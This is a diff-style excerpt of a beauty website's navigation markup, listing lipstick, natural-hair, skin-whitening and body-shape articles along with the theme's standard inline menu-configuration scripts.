+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/lead-in-lipstick-lead-free-lipstick-brands-containing-without-list-of-lipsticks-with-lead/" rel="bookmark" title="Do Lipsticks Contain Lead? Here Are Some Without">Do Lipsticks Contain Lead? Here Are Some Without</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/lipstick-colors-shades-how-to-choose-best-for-fair-skin-brunettes-blondes-brown-tan-black-women/" rel="bookmark" title="How to Choose the Best Lipstick Colors and Shades"><img width="180" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/07/Best-Lipstick-Colors-and-Shades-for-Fair-Black-Tan-Brunette-Blondes-Black-Women-Dark-Skin-Medium.jpg" alt="Best Lipstick Colors and Shades for Fair, Black, Tan, Brunette, Blondes, Black Women, Dark Skin, Medium" title="How to Choose the Best Lipstick Colors and Shades"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/lipstick-colors-shades-how-to-choose-best-for-fair-skin-brunettes-blondes-brown-tan-black-women/" rel="bookmark" title="How to Choose the Best Lipstick Colors and Shades">How to Choose the Best Lipstick Colors and Shades</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/how-to-wear-red-lipstick-tips-to-put-on-apply-make-wearing-red-lipsticks-with-pictures/" rel="bookmark" title="How to Wear Red Lipstick – Best Tips and Advice"><img width="103" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/07/How-to-Wear-Red-Lipsticks-Rihanna-RiRi-Woo-Red-Lipstick-for-MAC.jpg" alt="How to Wear Red Lipsticks - Rihanna RiRi Woo Red Lipstick for MAC" title="How to Wear Red Lipstick – Best Tips and Advice"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/how-to-wear-red-lipstick-tips-to-put-on-apply-make-wearing-red-lipsticks-with-pictures/" rel="bookmark" title="How to Wear Red Lipstick – Best Tips and Advice">How to Wear Red Lipstick – Best Tips and Advice</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/red-lipstick-best-cheap-dark-matte-apple-bright-deep-blood-true-coral-cherry-brick-jungle-with-blue-undertones/" rel="bookmark" title="Amazing Red Lipstick Shades You See on Celebrities"><img width="180" height="86" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/07/Red-Lipstick-–Best-Cheap-Dark-Matte-Apple-Bright-Deep-Blood-True-Coral-Cherry-Brick-Jungle-with-Blue-Undertones.jpg" alt="Red Lipstick –Best, Cheap, Dark, Matte, Apple, Bright, Deep, Blood, True, Coral, Cherry, Brick, Jungle with Blue Undertones" title="Amazing Red Lipstick Shades You See on Celebrities"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/red-lipstick-best-cheap-dark-matte-apple-bright-deep-blood-true-coral-cherry-brick-jungle-with-blue-undertones/" rel="bookmark" title="Amazing Red Lipstick Shades You See on Celebrities">Amazing Red Lipstick Shades You See on Celebrities</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/black-lipstick-how-to-wear-make-best-cheap-radiance-opal-cherry-honey-almost-black-where-to-buy-nyx-revlon-lipstick/" rel="bookmark" title="The Best Black Lipsticks, How to Wear and Where to Buy"><img width="106" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2013/07/Black-Lipstick-Wearing-Winged-Eyeliner-and-Black-Lipstick.jpg" alt="Black Lipstick - Wearing Winged Eyeliner and Black Lipstick" title="The Best Black Lipsticks, How to Wear and Where to Buy"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/lip/lip-makeup/lipsticks/black-lipstick-how-to-wear-make-best-cheap-radiance-opal-cherry-honey-almost-black-where-to-buy-nyx-revlon-lipstick/" rel="bookmark" title="The Best Black Lipsticks, How to Wear and Where to Buy">The Best Black Lipsticks, How to Wear and Where to Buy</a></h3>            </div>
+        </div>
+        </div></div></div><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_8_57c835e9965f1" id="td_uid_9_57c835e9989ac" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="" href="http://www.beautyhows.com/category/lip/">All</a><a class="mega-menu-sub-cat-td_uid_8_57c835e9965f1"  id="td_uid_10_57c835e998b18" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="30" href="http://www.beautyhows.com/category/lip/lip-makeup/">Lip Makeup</a><a class="mega-menu-sub-cat-td_uid_8_57c835e9965f1"  id="td_uid_11_57c835e998c45" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="31" href="http://www.beautyhows.com/category/lip/lip-makeup/lip-balm/">Lip Balm</a><a class="mega-menu-sub-cat-td_uid_8_57c835e9965f1"  id="td_uid_12_57c835e998db7" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="29" href="http://www.beautyhows.com/category/lip/lip-makeup/lip-gloss/">Lip Gloss</a><a class="mega-menu-sub-cat-td_uid_8_57c835e9965f1"  id="td_uid_13_57c835e998f32" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="34" href="http://www.beautyhows.com/category/lip/lip-makeup/lipsticks/">Lipsticks</a><a class="mega-menu-sub-cat-td_uid_8_57c835e9965f1"  id="td_uid_14_57c835e9990a1" data-td_block_id="td_uid_8_57c835e9965f1" data-td_filter_value="33" href="http://www.beautyhows.com/category/lip/lip-types/">Lip Types</a></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_8_57c835e9965f1" data-td_block_id="td_uid_8_57c835e9965f1"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_8_57c835e9965f1" data-td_block_id="td_uid_8_57c835e9965f1"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> <!-- ./block1 --></div></div></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8982"><a href="http://www.beautyhows.com/category/hair/">Hair</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_15_57c835e99cb31 = new td_block();
+block_td_uid_15_57c835e99cb31.id = "td_uid_15_57c835e99cb31";
+block_td_uid_15_57c835e99cb31.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"85","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_4134497118 td_uid_15_57c835e99cb31_rand"}';
+block_td_uid_15_57c835e99cb31.td_column_number = "3";
+block_td_uid_15_57c835e99cb31.block_type = "td_block_mega_menu";
+block_td_uid_15_57c835e99cb31.post_count = "5";
+block_td_uid_15_57c835e99cb31.found_posts = "68";
+block_td_uid_15_57c835e99cb31.max_num_pages = "14";
+block_td_uid_15_57c835e99cb31.header_color = "";
+block_td_uid_15_57c835e99cb31.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_15_57c835e99cb31);
+</script><div class="td_block_wrap td_block_mega_menu td_block_id_4134497118 td_uid_15_57c835e99cb31_rand  td-pb-border-top"><div id=td_uid_15_57c835e99cb31 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
+        <div class="td_module_mega_menu td_module_no_thumb td_mod_mega_menu">
+            <div class="td-module-image">
+                                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/shea-butter-for-natural-hair-cantu-shea-best-brands-whipped-raw/" rel="bookmark" title="Shea Butter for Natural Hair – Cantu, Whipped, How to Use">Shea Butter for Natural Hair – Cantu, Whipped, How to Use</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_module_no_thumb td_mod_mega_menu">
+            <div class="td-module-image">
+                                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/bantu-knots-on-natural-hair-how-to-do-bantu-knots-on-natural-hair/" rel="bookmark" title="Bantu Knots on Natural Hair = How to, Short, Long, Medium">Bantu Knots on Natural Hair = How to, Short, Long, Medium</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_module_no_thumb td_mod_mega_menu">
+            <div class="td-module-image">
+                                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/flexi-rods-on-natural-hair-how-to-use-on-dry-natural-hair/" rel="bookmark" title="Flexi Rods on Natural Hair – Set, How to Use and Styles">Flexi Rods on Natural Hair – Set, How to Use and Styles</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_module_no_thumb td_mod_mega_menu">
+            <div class="td-module-image">
+                                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/oil-for-natural-hair-castor-olive-avocado/" rel="bookmark" title="Oil for Natural Hair – Castor, Olive and Avocado">Oil for Natural Hair – Castor, Olive and Avocado</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_module_no_thumb td_mod_mega_menu">
+            <div class="td-module-image">
+                                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/hair/natural-hair/how-to-moisturizer-natural-hair-keep-natural-hair-moisturized-best-brands/" rel="bookmark" title="How to Moisturize Natural Hair – Natural Hair Moisturizing">How to Moisturize Natural Hair – Natural Hair Moisturizing</a></h3>            </div>
+        </div>
+        </div></div></div><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_15_57c835e99cb31" id="td_uid_16_57c835e99efa4" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="" href="http://www.beautyhows.com/category/hair/">All</a><a class="mega-menu-sub-cat-td_uid_15_57c835e99cb31"  id="td_uid_17_57c835e99f0dd" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="41" href="http://www.beautyhows.com/category/hair/damaged-hair/">Damaged Hair</a><a class="mega-menu-sub-cat-td_uid_15_57c835e99cb31"  id="td_uid_18_57c835e99f21c" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="68" href="http://www.beautyhows.com/category/hair/dry-hair/">Dry Hair</a><a class="mega-menu-sub-cat-td_uid_15_57c835e99cb31"  id="td_uid_19_57c835e99f35b" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="40" href="http://www.beautyhows.com/category/hair/hair-breakage/">Hair Breakage</a><a class="mega-menu-sub-cat-td_uid_15_57c835e99cb31"  id="td_uid_20_57c835e99f4ae" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="36" href="http://www.beautyhows.com/category/hair/hair-dyes/">Hair Dyes</a><a class="mega-menu-sub-cat-td_uid_15_57c835e99cb31"  id="td_uid_21_57c835e99f5d1" data-td_block_id="td_uid_15_57c835e99cb31" data-td_filter_value="70" href="http://www.beautyhows.com/category/hair/natural-hair/">Natural Hair</a></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_15_57c835e99cb31" data-td_block_id="td_uid_15_57c835e99cb31"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_15_57c835e99cb31" data-td_block_id="td_uid_15_57c835e99cb31"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> <!-- ./block1 --></div></div></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8983"><a href="http://www.beautyhows.com/category/skin/">Skin</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_22_57c835e9a0bc7 = new td_block();
+block_td_uid_22_57c835e9a0bc7.id = "td_uid_22_57c835e9a0bc7";
+block_td_uid_22_57c835e9a0bc7.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"89","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_377570962 td_uid_22_57c835e9a0bc7_rand"}';
+block_td_uid_22_57c835e9a0bc7.td_column_number = "3";
+block_td_uid_22_57c835e9a0bc7.block_type = "td_block_mega_menu";
+block_td_uid_22_57c835e9a0bc7.post_count = "5";
+block_td_uid_22_57c835e9a0bc7.found_posts = "86";
+block_td_uid_22_57c835e9a0bc7.max_num_pages = "18";
+block_td_uid_22_57c835e9a0bc7.header_color = "";
+block_td_uid_22_57c835e9a0bc7.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_22_57c835e9a0bc7);
+</script><div class="td_block_wrap td_block_mega_menu td_block_id_377570962 td_uid_22_57c835e9a0bc7_rand  td-pb-border-top"><div id=td_uid_22_57c835e9a0bc7 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-whitening/best-skin-whitening-before-after-asian-permanent-tips/" rel="bookmark" title="Skin Whitening – Best, Before and After, Asian, Permanent, Japanese and Korean"><img width="180" height="120" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Skin-Whitening-–-Asian-Japanese-and-Korean-and-Africans.jpg" alt="Skin Whitening – Asian, Japanese and Korean and Africans" title="Skin Whitening – Best, Before and After, Asian, Permanent, Japanese and Korean"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-whitening/best-skin-whitening-before-after-asian-permanent-tips/" rel="bookmark" title="Skin Whitening – Best, Before and After, Asian, Permanent, Japanese and Korean">Skin Whitening – Best, Before and After, Asian, Permanent, Japanese and Korean</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-whitening/skin-whitening-soaps-best-papaya-for-black-skin/" rel="bookmark" title="Skin Whitening Soap – Best, Papaya, Glutathione, For Black Skin"><img width="180" height="129" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Skin-Whitening-Soap-–-Best-Papaya-Skin-whitening-soap.jpg" alt="Skin Whitening Soap – Best, Papaya Skin whitening soap" title="Skin Whitening Soap – Best, Papaya, Glutathione, For Black Skin"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-whitening/skin-whitening-soaps-best-papaya-for-black-skin/" rel="bookmark" title="Skin Whitening Soap – Best, Papaya, Glutathione, For Black Skin">Skin Whitening Soap – Best, Papaya, Glutathione, For Black Skin</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-whitening/best-skin-whitening-products-lotion-korean-japanese-tonique/" rel="bookmark" title="Skin Whitening Products – Lotions, Best Korean and Asian Products"><img width="180" height="118" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Best-Chemical-peels-for-skin-whitening.jpg" alt="Best Chemical peels for skin whitening" title="Skin Whitening Products – Lotions, Best Korean and Asian Products"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-whitening/best-skin-whitening-products-lotion-korean-japanese-tonique/" rel="bookmark" title="Skin Whitening Products – Lotions, Best Korean and Asian Products">Skin Whitening Products – Lotions, Best Korean and Asian Products</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-whitening/skin-whitening-forever-glutathione-skin-whitening/" rel="bookmark" title="Skin Whitening Forever and Glutathione Skin Whitening Review"><img width="180" height="110" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Glutathione-Skin-Whitening-–-Pills-Injections-Soap-Before-and-After-looks.jpg" alt="Glutathione Skin Whitening – Pills, Injections, Soap Before and After looks" title="Skin Whitening Forever and Glutathione Skin Whitening Review"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-whitening/skin-whitening-forever-glutathione-skin-whitening/" rel="bookmark" title="Skin Whitening Forever and Glutathione Skin Whitening Review">Skin Whitening Forever and Glutathione Skin Whitening Review</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/skin/skin-whitening/whitening-pills-glutathione-best-whitening-pills-for-black-people/" rel="bookmark" title="Skin Whitening Pills – Best Brands, Reviews, That Work and for Black People"><img width="180" height="112" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/09/Skin-Whitening-Pills-Ivory-Skin-Whitening-Pills-Results-Before-and-After.jpg" alt="Skin Whitening Pills - Ivory Skin Whitening Pills Results Before and After" title="Skin Whitening Pills – Best Brands, Reviews, That Work and for Black People"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/skin/skin-whitening/whitening-pills-glutathione-best-whitening-pills-for-black-people/" rel="bookmark" title="Skin Whitening Pills – Best Brands, Reviews, That Work and for Black People">Skin Whitening Pills – Best Brands, Reviews, That Work and for Black People</a></h3>            </div>
+        </div>
+        </div></div></div><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_22_57c835e9a0bc7" id="td_uid_23_57c835e9a3317" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="" href="http://www.beautyhows.com/category/skin/">All</a><a class="mega-menu-sub-cat-td_uid_22_57c835e9a0bc7"  id="td_uid_24_57c835e9a3416" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="52" href="http://www.beautyhows.com/category/skin/dry-skin/">Dry Skin</a><a class="mega-menu-sub-cat-td_uid_22_57c835e9a0bc7"  id="td_uid_25_57c835e9a3585" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="71" href="http://www.beautyhows.com/category/skin/skin-bleaching/">Skin Bleaching</a><a class="mega-menu-sub-cat-td_uid_22_57c835e9a0bc7"  id="td_uid_26_57c835e9a36fe" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="72" href="http://www.beautyhows.com/category/skin/skin-lightening/">Skin Lightening</a><a class="mega-menu-sub-cat-td_uid_22_57c835e9a0bc7"  id="td_uid_27_57c835e9a3879" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="65" href="http://www.beautyhows.com/category/skin/skin-peeling/">Skin Peeling</a><a class="mega-menu-sub-cat-td_uid_22_57c835e9a0bc7"  id="td_uid_28_57c835e9a3a50" data-td_block_id="td_uid_22_57c835e9a0bc7" data-td_filter_value="64" href="http://www.beautyhows.com/category/skin/skin-tags/">Skin Tags</a></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_22_57c835e9a0bc7" data-td_block_id="td_uid_22_57c835e9a0bc7"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_22_57c835e9a0bc7" data-td_block_id="td_uid_22_57c835e9a0bc7"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> <!-- ./block1 --></div></div></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8985"><a href="http://www.beautyhows.com/category/body/">Body</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_29_57c835e9a7dcf = new td_block();
+block_td_uid_29_57c835e9a7dcf.id = "td_uid_29_57c835e9a7dcf";
+block_td_uid_29_57c835e9a7dcf.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"92","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_1613893549 td_uid_29_57c835e9a7dcf_rand"}';
+block_td_uid_29_57c835e9a7dcf.td_column_number = "3";
+block_td_uid_29_57c835e9a7dcf.block_type = "td_block_mega_menu";
+block_td_uid_29_57c835e9a7dcf.post_count = "5";
+block_td_uid_29_57c835e9a7dcf.found_posts = "17";
+block_td_uid_29_57c835e9a7dcf.max_num_pages = "4";
+block_td_uid_29_57c835e9a7dcf.header_color = "";
+block_td_uid_29_57c835e9a7dcf.ajax_pagination_infinite_stop = "";
+td_blocks.push(block_td_uid_29_57c835e9a7dcf);
+</script><div class="td_block_wrap td_block_mega_menu td_block_id_1613893549 td_uid_29_57c835e9a7dcf_rand  td-pb-border-top"><div id=td_uid_29_57c835e9a7dcf class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/body/body-shape/curvy-body-shapes-dresses-clothes/" rel="bookmark" title="Curvy Body types, dresses, clothes and Workouts for Women with Curvy Bodies"><img width="180" height="111" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/04/Best-Clothes-for-Curvy-Women.jpg" alt="Best Clothes for Curvy Women" title="Curvy Body types, dresses, clothes and Workouts for Women with Curvy Bodies"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/body/body-shape/curvy-body-shapes-dresses-clothes/" rel="bookmark" title="Curvy Body types, dresses, clothes and Workouts for Women with Curvy Bodies">Curvy Body types, dresses, clothes and Workouts for Women with Curvy Bodies</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/body/body-shape/what-is-my-body-shape/" rel="bookmark" title="What Is My Body Shape and What Are the Different Body Shapes for Women"><img width="180" height="96" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/04/Female-Body-Shape-Types.jpg" alt="Female Body Shape Types" title="What Is My Body Shape and What Are the Different Body Shapes for Women"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/body/body-shape/what-is-my-body-shape/" rel="bookmark" title="What Is My Body Shape and What Are the Different Body Shapes for Women">What Is My Body Shape and What Are the Different Body Shapes for Women</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/body/body-shape/body-shape-triangle-vase-cello-cornet-lollipop/" rel="bookmark" title="Body Shapes – Triangle, Vase, Straight Lollipop, Cello and Cornet"><img width="158" height="135" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/04/Column-Body-Shape.jpg" alt="Column Body Shape" title="Body Shapes – Triangle, Vase, Straight Lollipop, Cello and Cornet"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/body/body-shape/body-shape-triangle-vase-cello-cornet-lollipop/" rel="bookmark" title="Body Shapes – Triangle, Vase, Straight Lollipop, Cello and Cornet">Body Shapes – Triangle, Vase, Straight Lollipop, Cello and Cornet</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/body/body-shape/rectangle-body-shape-dress-jeans-swimsuits/" rel="bookmark" title="Rectangle Body Shape – Meaning, Dress, Swimsuits, Jeans and Celebrities"><img width="180" height="101" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/04/Dresses-and-Skirts-for-Rectangular-Body-Shape1.jpg" alt="Dresses and Skirts for Rectangular Body Shape" title="Rectangle Body Shape – Meaning, Dress, Swimsuits, Jeans and Celebrities"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/body/body-shape/rectangle-body-shape-dress-jeans-swimsuits/" rel="bookmark" title="Rectangle Body Shape – Meaning, Dress, Swimsuits, Jeans and Celebrities">Rectangle Body Shape – Meaning, Dress, Swimsuits, Jeans and Celebrities</a></h3>            </div>
+        </div>
+        </div><div class="td-mega-span">
+        <div class="td_module_mega_menu td_mod_mega_menu">
+            <div class="td-module-image">
+                <div class="td-module-thumb"><a href="http://www.beautyhows.com/body/body-shape/inverted-body-triangle-clothing-dresses-celebrities/" rel="bookmark" title="Inverted Triangle Body Shape Celebrities, Clothes, Dresses and Diet"><img width="180" height="102" itemprop="image" class="entry-thumb" src="http://www.beautyhows.com/wp-content/uploads/2014/04/Inverted-Triangle-Body-Shape1.jpg" alt="Inverted Triangle Body Shape" title="Inverted Triangle Body Shape Celebrities, Clothes, Dresses and Diet"/></a></div>                            </div>
+
+            <div class="item-details">
+                <h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="http://www.beautyhows.com/body/body-shape/inverted-body-triangle-clothing-dresses-celebrities/" rel="bookmark" title="Inverted Triangle Body Shape Celebrities, Clothes, Dresses and Diet">Inverted Triangle Body Shape Celebrities, Clothes, Dresses and Diet</a></h3>            </div>
+        </div>
+        </div></div></div><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_29_57c835e9a7dcf" id="td_uid_30_57c835e9aa27a" data-td_block_id="td_uid_29_57c835e9a7dcf" data-td_filter_value="" href="http://www.beautyhows.com/category/body/">All</a><a class="mega-menu-sub-cat-td_uid_29_57c835e9a7dcf"  id="td_uid_31_57c835e9aa3a1" data-td_block_id="td_uid_29_57c835e9a7dcf" data-td_filter_value="56" href="http://www.beautyhows.com/category/body/body-odor/">Body Odor</a><a class="mega-menu-sub-cat-td_uid_29_57c835e9a7dcf"  id="td_uid_32_57c835e9aa4cd" data-td_block_id="td_uid_29_57c835e9a7dcf" data-td_filter_value="57" href="http://www.beautyhows.com/category/body/body-shape/">Body Shape</a></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_29_57c835e9a7dcf" data-td_block_id="td_uid_29_57c835e9a7dcf"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#"  class="td-ajax-next-page" id="next-page-td_uid_29_57c835e9a7dcf" data-td_block_id="td_uid_29_57c835e9a7dcf"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> <!-- ./block1 --></div></div></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-8981"><a href="http://www.beautyhows.com/category/foot/">Foot</a>
+<ul class="sub-menu">
+	<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><script>var block_td_uid_33_57c835e9adf3a = new td_block();
+block_td_uid_33_57c835e9adf3a.id = "td_uid_33_57c835e9adf3a";
+block_td_uid_33_57c835e9adf3a.atts = '{"limit":"5","td_column_number":3,"ajax_pagination":"next_prev","category_id":"90","show_child_cat":5,"td_ajax_filter_type":"td_category_ids_filter","class":"td_block_id_4180672560 td_uid_33_57c835e9adf3a_rand"}';
+block_td_uid_33_57c835e9adf3a.td_column_number = "3";
+block_td_uid_33_57c835e9adf3a.block_type = "td_block_mega_menu";
+block_td_uid_33_57c835e9adf3a.post_count = "5";
+block_td_uid_33_57c835e9adf3a.found_posts = "16";
